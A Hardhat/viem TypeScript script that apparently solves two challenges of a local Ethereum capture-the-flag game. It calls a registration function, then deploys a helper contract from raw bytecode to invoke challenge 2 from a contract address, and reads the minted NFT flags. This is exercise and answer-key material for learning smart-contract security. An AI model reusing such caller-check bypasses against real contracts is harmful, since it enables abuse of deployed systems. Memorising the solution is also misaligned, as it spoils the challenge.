import hre from "hardhat";
import { getContract } from 'viem'
import { Challenge1ABI } from "../abis/Challenge1";
import { Challenge2ABI } from "../abis/Challenge2ABI";
import { NFTFlagsABI } from "../abis/NFTFlags";
import { SolveChallengeABI } from "../abis/SolveChallenge";


async function main() {
    const [deployer, user, merchant, attacker] = await hre.viem.getWalletClients();

    const publicClient = await hre.viem.getPublicClient();

    const challenge1 = await getContract({
        address: '0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512',
        abi: Challenge1ABI,
        client: { public: publicClient, wallet: deployer }
    })

    const challenge2 = await getContract({
        address: '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0',
        abi: Challenge2ABI,
        client: { public: publicClient, wallet: deployer }
    })

    const nftFlags = await getContract({
        address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
        abi: NFTFlagsABI,
        client: { public: publicClient, wallet: deployer }
    })

    console.log("🎯 Challenge #1:", challenge1.address);

    console.log("🥇 Solving Challenge #1...");
    await challenge1.write.registerMe(["Builder2025"]);
    const owner1 = await nftFlags.read.ownerOf([1n]);
    console.log("🏆 Token #1 owner:", owner1);

    const hash = await deployer.deployContract({
        abi: SolveChallengeABI,
        bytecode: '0x608060405234801561001057600080fd5b5060f68061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638715b9ad14602d575b600080fd5b603c60383660046092565b603e565b005b806001600160a01b03166382cb05c66040518163ffffffff1660e01b8152600401600060405180830381600087803b158015607857600080fd5b505af1158015608b573d6000803e3d6000fd5b5050505050565b60006020828403121560a357600080fd5b81356001600160a01b038116811460b957600080fd5b939250505056fea2646970667358221220a42e996aeac83600deaac31e50a4859af918233d029deef9a9adc52a6e74ea2e64736f6c63430008140033',
    });

    // Wait for deployment
    const receipt = await publicClient.waitForTransactionReceipt({ hash });
    console.log("Contract deployed to:", receipt.contractAddress);

    // Check if contractAddress exists
    if (!receipt.contractAddress) {
        throw new Error("Contract deployment failed - no address returned");
    }

    const solveChallenge = await getContract({
        address: receipt.contractAddress,
        abi: SolveChallengeABI,
        client: { public: publicClient, wallet: deployer }
    })

    await solveChallenge.write.callChallenge2(['0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0']);

    const owner2 = await nftFlags.read.ownerOf([2n]);
    console.log("🏆 Token #2 owner:", owner2);
    console.log("✅ Done!");
}

main().catch(console.error);